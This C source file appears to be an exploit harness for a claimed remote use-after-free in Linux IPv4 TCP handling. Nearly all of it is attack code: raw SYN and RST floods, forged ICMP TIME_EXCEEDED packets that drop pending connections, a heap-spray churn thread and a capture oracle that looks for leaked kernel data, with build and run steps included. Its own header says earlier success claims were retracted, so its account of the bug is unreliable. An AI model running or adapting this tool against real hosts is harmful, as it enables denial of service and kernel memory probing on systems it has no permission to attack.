/* exp_tcp.c - CVE-2026-98432 remote UAF trigger, PLAIN IPv4 TCP (no MPTCP).
 *
 * Bug (net/ipv4/tcp_ipv4.c, Ubuntu 6.8.0-101, fix e3f33b0a1d89 not backported):
 *   reader: tcp_v4_send_synack()  rcu_dereference(ireq->ireq_opt)  [L1207]
 *   free:   tcp_v4_reqsk_destructor()  kfree(ireq->ireq_opt)       [L1221]
 *   -> free does not wait for the RCU reader.
 *
 * Remote race (all plain TCP/ICMP, no MPTCP, no keys):
 *   READER: per flow, the FIRST dup SYN (seq==rcv_isn) always retransmits the
 *           SYN-ACK via inet_rtx_syn_ack() -> reads ireq_opt on the flow's
 *           RSS CPU (tcp_minisocks.c L679-720; rate limiter starts empty).
 *   FREE:   forged ICMP_TIME_EXCEEDED quoting that flow's SYN-ACK with
 *           seq==snt_isn (learned by capturing the SYN-ACK) ->
 *           tcp_v4_err()->tcp_req_err()->inet_csk_reqsk_queue_drop()
 *           -> destructor kfree(ireq_opt) on the ICMP packet's RSS CPU
 *           (different queue than the TCP flow -> cross-CPU race).
 *   RECLAIM: SYN(RR marker)+RST churn hammers kmalloc-64 save_options/
 *           destructor alloc+free so a freed slot is quickly refilled with a
 *           distinguishable marker.
 *   DETECT: a retransmitted SYN-ACK whose RR option carries ANOTHER flow's
 *           marker == the UAF read observed on the wire.
 *
 * Build: gcc -O2 -pthread -o exp_tcp exp_tcp.c
 * Run:   sudo setcap cap_net_raw+ep exp_tcp   (or run as root)
 *        ./exp_tcp <target_ip> [port] [runtime_s]
 *
 * STATUS (2026-11-09): the 2026-11-06 "23 cross-flow hits" result from this
 * harness was retracted. AGENTS.md later showed they were same-slot
 * generation-skew artifacts: 0 genuine hits in 16M+ attempts, and the req
 * destructor runs only after the reader drops its reference. Keep this as a
 * detection/tooling harness; do not cite it as a verified remote UAF until a
 * generation-filtered run reproduces it. See docs/STATUS.md.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define IPHDR  20
#define OPTLEN 40
#define TCPHDR 20

#define NSLOTS 64                /* concurrent victim flows (young-queue cap) */
#define VBASE  40000             /* victim sport range: VBASE..VBASE+NSLOTS */
#define CBASE  43000             /* churn sport range */
#define CNUM   2048
#define BURST  8                 /* ICMP frees per attempt */
#define CHURN_RATE 16000         /* churn SYN+RST pairs per second */

#define VMARK(x)  (0x5AA50000u | ((x) & 0x7FFF))
#define CMARK(x)  (0x5AA5C000u | ((x) & 0x3FFF))

static char g_target[64], g_self[64];
static struct sockaddr_in g_dst;
static int g_dport = 22, g_runtime = 300;
static volatile int g_run = 1;
static int g_fd = -1;

enum { ST_FREE = 0, ST_SYNSENT, ST_READY, ST_DONE };
struct flow {
    _Atomic int state;
    _Atomic uint32_t snt_isn;    /* 0 = not captured yet */
    uint32_t client_isn;
    uint32_t marker;
    struct timespec t0;
};
static struct flow g_flows[NSLOTS];

static atomic_ulong g_syn, g_dup, g_icmp, g_synack, g_hit, g_churnhit, g_churn;
static atomic_ulong g_foreign, g_bare, g_stale;
static atomic_int g_dbg_dump = 3;

static void die(const char *m) { perror(m); exit(1); }

static uint16_t csum(const void *b, int len)
{
    const uint8_t *p = b; uint32_t s = 0;
    while (len > 1) { s += (p[0] << 8) | p[1]; p += 2; len -= 2; }
    if (len) s += p[0] << 8;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}

static void ip_hdr_fill(uint8_t *ip, int total, int proto,
                        const char *src, const char *dst)
{
    memset(ip, 0, IPHDR);
    ip[0] = 0x45; ip[2] = total >> 8; ip[3] = total & 0xff;
    ip[6] = 0x40; ip[8] = 64; ip[9] = proto;
    inet_pton(AF_INET, src, ip + 12);
    inet_pton(AF_INET, dst, ip + 16);
    uint16_t c = csum(ip, IPHDR);
    ip[10] = c >> 8; ip[11] = c & 0xff;
}

static void tcp_sum(uint8_t *ip, uint8_t *tcp, int tlen)
{
    uint8_t b[12 + TCPHDR];
    memcpy(b, ip + 12, 8); b[8] = 0; b[9] = 6; b[10] = tlen >> 8; b[11] = tlen;
    tcp[16] = tcp[17] = 0;
    memcpy(b + 12, tcp, tlen);
    uint16_t c = csum(b, 12 + tlen);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
}

/* SYN (optionally with RR marker); returns packet length */
static int build_syn(uint8_t *pkt, uint16_t sport, uint32_t seq, uint32_t marker)
{
    int ihl = marker ? IPHDR + OPTLEN : IPHDR;
    int total = ihl + TCPHDR;
    memset(pkt, 0, total);                          /* never leave option garbage */
    uint8_t *ip = pkt, *tcp = pkt + ihl;
    ip_hdr_fill(ip, total, 6, g_self, g_target);
    if (marker) {
        ip[0] = 0x40 | (ihl / 4);
        uint8_t *o = pkt + IPHDR;
        o[0] = 7; o[1] = 39; o[2] = 4;              /* RR kind7 len39 ptr4 */
        memcpy(o + 3 + 4, &marker, 4);              /* slots 1..3 survive */
        memcpy(o + 3 + 8, &marker, 4);
        memcpy(o + 3 + 12, &marker, 4);
        uint16_t c = csum(ip, ihl);                 /* redo IP csum */
        ip[10] = c >> 8; ip[11] = c & 0xff;
    }
    memset(tcp, 0, TCPHDR);
    tcp[0] = sport >> 8; tcp[1] = sport;
    tcp[2] = g_dport >> 8; tcp[3] = g_dport;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[12] = 5 << 4; tcp[13] = 0x02;               /* SYN */
    tcp[14] = 0xff; tcp[15] = 0xff;
    tcp_sum(ip, tcp, TCPHDR);
    return total;
}

static int build_rst(uint8_t *pkt, uint16_t sport, uint32_t seq)
{
    memset(pkt, 0, IPHDR + TCPHDR);
    uint8_t *ip = pkt, *tcp = pkt + IPHDR;
    ip_hdr_fill(ip, IPHDR + TCPHDR, 6, g_self, g_target);
    memset(tcp, 0, TCPHDR);
    tcp[0] = sport >> 8; tcp[1] = sport;
    tcp[2] = g_dport >> 8; tcp[3] = g_dport;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[12] = 5 << 4; tcp[13] = 0x04;               /* RST */
    tcp[14] = 0xff; tcp[15] = 0xff;
    tcp_sum(ip, tcp, TCPHDR);
    return IPHDR + TCPHDR;
}

/* ICMP_TIME_EXCEEDED quoting the flow's SYN-ACK (src=target,dst=us,seq=snt_isn)
 * -> tcp_v4_err -> tcp_req_err(abort) -> drop req -> kfree(ireq_opt). */
static int build_icmp_free(uint8_t *pkt, uint16_t sport, uint32_t snt_isn)
{
    uint8_t *ip = pkt;
    uint8_t *icmp = pkt + IPHDR;
    uint8_t *iip = icmp + 8;
    uint8_t *itcp = iip + IPHDR;
    int total = IPHDR + 8 + IPHDR + TCPHDR;
    memset(pkt, 0, total);
    ip_hdr_fill(ip, total, 1, g_self, g_target);
    memset(icmp, 0, 8);
    icmp[0] = 11; icmp[1] = 0;                      /* TIME_EXCEEDED */
    /* inner: the target's SYN-ACK */
    ip_hdr_fill(iip, IPHDR + TCPHDR, 6, g_target, g_self);
    memset(itcp, 0, TCPHDR);
    itcp[0] = g_dport >> 8; itcp[1] = g_dport;
    itcp[2] = sport >> 8; itcp[3] = sport;
    itcp[4] = snt_isn >> 24; itcp[5] = snt_isn >> 16;
    itcp[6] = snt_isn >> 8; itcp[7] = snt_isn;
    itcp[12] = 5 << 4; itcp[13] = 0x12;             /* SYN|ACK */
    uint16_t c = csum(icmp, 8 + IPHDR + TCPHDR);
    icmp[2] = c >> 8; icmp[3] = c & 0xff;
    return total;
}

static void xsend(const uint8_t *pkt, int len)
{
    sendto(g_fd, pkt, len, 0, (struct sockaddr *)&g_dst, sizeof(g_dst));
}

/* ---------------- capture: learn snt_isn, detect cross-flow markers -------
 * AF_PACKET so that UAF-corrupted (mangled-ihl) SYN-ACKs are still seen:
 * they would be dropped/misparsed by the local IP stack on a raw IP socket.
 * Any anomaly that is NOT our own marker gets a full packet hexdump - that
 * is the foreign-content / over-read leak oracle. */
static void *capture(void *arg)
{
    (void)arg;
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (s < 0) die("capture socket (AF_PACKET)");
    int rcv = 8 << 20;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    uint8_t buf[2048];
    while (g_run) {
        ssize_t n = recv(s, buf, sizeof(buf), 0);
        if (n < 14 + IPHDR + TCPHDR) continue;
        uint8_t *ip = buf + 14;
        if ((ip[0] >> 4) != 4) continue;
        int ihl = (ip[0] & 0xf) * 4;
        if (ihl < IPHDR || n < 14 + ihl + TCPHDR) continue;
        uint8_t *tcp = ip + ihl;
        if ((tcp[13] & 0x12) != 0x12) continue;     /* SYN+ACK */
        if (((tcp[0] << 8) | tcp[1]) != g_dport) continue;
        uint16_t dport = (tcp[2] << 8) | tcp[3];
        if (dport < VBASE || dport >= VBASE + NSLOTS) continue;
        int slot = dport - VBASE;
        struct flow *f = &g_flows[slot];
        uint32_t seq = ((uint32_t)tcp[4] << 24) | (tcp[5] << 16) |
                       (tcp[6] << 8) | tcp[7];
        uint32_t ack = ((uint32_t)tcp[8] << 24) | (tcp[9] << 16) |
                       (tcp[10] << 8) | tcp[11];
        atomic_fetch_add(&g_synack, 1);
        /* generation check: a stale req (ICMP free lost) retransmits a
         * SYN-ACK that acks the PREVIOUS generation's client_isn - that is
         * NOT a UAF read. Kill the stale req with an ICMP quoting its own
         * snt_isn and ignore the packet for marker analysis. */
        if (ack != f->client_isn + 1) {
            atomic_fetch_add(&g_stale, 1);
            uint8_t ic[128];
            int m = build_icmp_free(ic, dport, seq);
            xsend(ic, m);
            continue;
        }
        if (!f->snt_isn) {
            f->snt_isn = seq;
            if (f->state == ST_SYNSENT) f->state = ST_READY;
        }
        int olen = ihl - IPHDR;
        if (atomic_fetch_add(&g_dbg_dump, 0) > 0 && olen >= 8) {
            atomic_fetch_sub(&g_dbg_dump, 1);
            fprintf(stderr, "[dbg] SYN-ACK slot=%d seq=%u opts(%d):", slot, seq, olen);
            for (int i = 0; i < olen; i++) fprintf(stderr, " %02x", ip[IPHDR + i]);
            fprintf(stderr, "\n");
        }
        if (olen < 8) {
            /* expected shape is ihl=15 with our RR echo - anything else is
             * interesting (freed-not-reclaimed => optlen=0 => ihl=5) */
            if (olen == 0) atomic_fetch_add(&g_bare, 1);
            continue;
        }
        int own = 0, foreign = 0, ptrlike = 0;
        uint8_t *o = ip + IPHDR;
        for (int i = 0; i + 3 < olen;) {
            if (o[i] == 0) break;
            if (o[i] == 1) { i++; continue; }
            int l = o[i + 1];
            if (l < 2 || i + l > olen) { foreign = 1; break; }
            if (o[i] == 7 && l >= 8) {              /* RR option */
                for (int k = 3; k + 4 <= l; k += 4) {
                    uint32_t v; memcpy(&v, o + i + k, 4);
                    if (v == f->marker) { own = 1; continue; }
                    if ((v & 0xFFFF8000u) == 0x5AA50000u) {
                        atomic_fetch_add(&g_hit, 1);
                        if (g_hit <= 20)
                            printf("[+] CROSS-FLOW UAF: slot=%d marker=0x%08x (expected 0x%08x)\n",
                                   slot, v, f->marker);
                    } else if ((v & 0xFFFFC000u) == 0x5AA5C000u) {
                        atomic_fetch_add(&g_churnhit, 1);
                        if (g_churnhit <= 20)
                            printf("[+] CHURN-RECLAIM UAF: slot=%d marker=0x%08x (expected 0x%08x)\n",
                                   slot, v, f->marker);
                    } else if ((v & 0x000000FFu) == 0x0000007Fu ||
                               (v & 0x0000FFFFu) == 0x0000A8C0u) {
                        /* 127.x / 192.168.x RR recordings (wire LE) - normal */
                    } else if ((v & 0xFFFF0000u) == 0xFFFF0000u) {
                        ptrlike = 1;                 /* kernel-pointer-shaped */
                    } else if (v != 0) {
                        foreign = 1;
                    }
                }
            } else if (o[i] != 7) {
                foreign = 1;                         /* unexpected option kind */
            }
            i += l;
        }
        if ((ptrlike || foreign) && !own) {
            atomic_fetch_add(&g_foreign, 1);
            if (g_foreign <= 30) {
                printf("[%s] slot=%d ihl=%d pkt(%zd):", ptrlike ? "PTR?" : "FOREIGN",
                       slot, ihl, n - 14);
                for (int i = 0; i < n - 14 && i < 128; i++)
                    printf(" %02x", ip[i]);
                printf("\n");
            }
        }
    }
    return NULL;
}

/* ---------------- victim creator: fresh flows with RR markers ------------- */
static void *creator(void *arg)
{
    (void)arg;
    uint8_t pkt[128];
    uint32_t cnt = 0;
    struct timespec last = { 0, 0 };
    while (g_run) {
        /* pace ~2000 new victims/s so the young queue / RX queues can drain */
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        long us = (now.tv_sec - last.tv_sec) * 1000000L +
                  (now.tv_nsec - last.tv_nsec) / 1000;
        if (us < 500) { usleep(100); continue; }
        last = now;
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct flow *f = &g_flows[s];
            int expect = ST_FREE;
            if (!atomic_compare_exchange_strong(&f->state, &expect, ST_SYNSENT))
                continue;
            f->marker = VMARK(cnt);
            f->client_isn = 0x6d500000u + cnt * 7919u;
            f->snt_isn = 0;
            f->t0 = now;
            int n = build_syn(pkt, VBASE + s, f->client_isn, f->marker);
            xsend(pkt, n);
            atomic_fetch_add(&g_syn, 1);
            cnt++;
            break;                                  /* one per pace tick */
        }
    }
    return NULL;
}

/* ---------------- attempter: dup-SYN read + ICMP free, back to back ------- */
static void *attempter(void *arg)
{
    (void)arg;
    uint8_t dup[128], icmp[128];
    while (g_run) {
        int did = 0;
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct flow *f = &g_flows[s];
            int expect = ST_READY;
            if (!atomic_compare_exchange_strong(&f->state, &expect, ST_DONE))
                continue;
            uint32_t snt = f->snt_isn;
            clock_gettime(CLOCK_MONOTONIC, &f->t0);    /* reaper settles 3ms later */
            int ndup = build_syn(dup, VBASE + s, f->client_isn, f->marker);
            int nic  = build_icmp_free(icmp, VBASE + s, snt);
            /* reader: first dup SYN -> guaranteed SYN-ACK rtx (reads ireq_opt).
             * The following dup burst hits the SAME RSS queue on the target;
             * each arrival raises a NIC IRQ that preempts the reader softirq
             * mid-read, stretching the ~300ns window to ~usec. The ICMP frees
             * (different queue/CPU) ride through the stretched window. A dup
             * that lands after a successful free re-creates the req and its
             * initial SYN-ACK build is yet another reader - a cascade of
             * create/free/read cycles per attempt. */
            xsend(dup, ndup);
            atomic_fetch_add(&g_dup, 1);
            for (int b = 0; b < 24; b++) {
                xsend(dup, ndup);
                atomic_fetch_add(&g_dup, 1);
                if (b % 3 == 1) {                   /* 8 ICMPs interleaved */
                    xsend(icmp, nic);
                    atomic_fetch_add(&g_icmp, 1);
                }
            }
            did++;
        }
        if (!did) usleep(100);
    }
    return NULL;
}

/* ---------------- reaper: RST done/stuck slots back to free -------------- */
static void *reaper(void *arg)
{
    (void)arg;
    uint8_t pkt[64];
    while (g_run) {
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct flow *f = &g_flows[s];
            long age_ms = (now.tv_sec - f->t0.tv_sec) * 1000L +
                          (now.tv_nsec - f->t0.tv_nsec) / 1000000;
            int st = f->state;
            if (st == ST_DONE && age_ms >= 3) {
                /* let the race settle, then clean any req off the slot */
            } else if (st == ST_SYNSENT && age_ms >= 1500) {
                /* SYN-ACK never arrived (req lost) - recycle the slot */
            } else {
                continue;
            }
            int n = build_rst(pkt, VBASE + s, f->client_isn + 1);
            xsend(pkt, n);
            f->snt_isn = 0;
            f->state = ST_FREE;
        }
        usleep(500);
    }
    return NULL;
}

/* ---------------- churn: kmalloc-64 save_options alloc/free spray --------- */
static void *churn(void *arg)
{
    (void)arg;
    uint8_t syn[128], rst[64];
    int ns = build_syn(syn, 0, 0, 1);                /* length probe */
    int nr = build_rst(rst, 0, 0);
    const int batch = 64;                            /* per pace tick */
    const long tick_us = 1000000L * batch / CHURN_RATE;
    for (uint32_t i = 0; g_run; i++) {
        uint16_t sport = CBASE + (i % CNUM);
        uint32_t isn = 0x12340000u + i;
        ns = build_syn(syn, sport, isn, CMARK(i));   /* alloc on target */
        xsend(syn, ns);
        nr = build_rst(rst, sport, isn + 1);         /* free right after */
        xsend(rst, nr);
        atomic_fetch_add(&g_churn, 1);
        if (i % batch == (uint32_t)batch - 1) usleep(tick_us);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 2) {
        fprintf(stderr, "usage: %s <target_ip> [port] [runtime_s]\n", argv[0]);
        return 1;
    }
    snprintf(g_target, sizeof(g_target), "%s", argv[1]);
    if (argc > 2) g_dport = atoi(argv[2]);
    if (argc > 3) g_runtime = atoi(argv[3]);
    memset(&g_dst, 0, sizeof(g_dst));
    g_dst.sin_family = AF_INET;
    g_dst.sin_port = htons(g_dport);
    if (inet_pton(AF_INET, g_target, &g_dst.sin_addr) != 1) die("bad target ip");

    g_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (g_fd < 0) {
        fprintf(stderr, "[-] raw socket failed (errno=%d). Need root OR:\n"
                        "    sudo setcap cap_net_raw+ep %s\n", errno, argv[0]);
        return 1;
    }
    /* find our source IP toward the target */
    int u = socket(AF_INET, SOCK_DGRAM, 0);
    if (u >= 0) {
        if (connect(u, (struct sockaddr *)&g_dst, sizeof(g_dst)) == 0) {
            struct sockaddr_in lo; socklen_t sl = sizeof(lo);
            if (getsockname(u, (struct sockaddr *)&lo, &sl) == 0)
                inet_ntop(AF_INET, &lo.sin_addr, g_self, sizeof(g_self));
        }
        close(u);
    }
    if (!g_self[0]) die("cannot determine source ip");
    printf("[*] exp_tcp: target=%s:%d src=%s slots=%d runtime=%ds\n",
           g_target, g_dport, g_self, NSLOTS, g_runtime);
    printf("[*] plain-TCP race: dup-SYN reader + ICMP_TIME_EXCEEDED free (no MPTCP)\n");

    pthread_t th[5];
    pthread_create(&th[0], NULL, capture, NULL);
    pthread_create(&th[1], NULL, creator, NULL);
    pthread_create(&th[2], NULL, attempter, NULL);
    pthread_create(&th[3], NULL, reaper, NULL);
    pthread_create(&th[4], NULL, churn, NULL);

    sleep(g_runtime);
    g_run = 0;
    for (int i = 0; i < 5; i++) pthread_join(th[i], NULL);

    printf("[*] done: syn=%lu dup=%lu icmp=%lu synack=%lu stale=%lu xflow=%lu churn_reclaim=%lu foreign=%lu bare=%lu churn=%lu\n",
           g_syn, g_dup, g_icmp, g_synack, g_stale, g_hit, g_churnhit, g_foreign, g_bare, g_churn);
    if (g_hit || g_churnhit)
        printf("[+] USE-AFTER-FREE observed on the wire\n");
    else
        printf("[-] no UAF evidence this run\n");
    return 0;
}
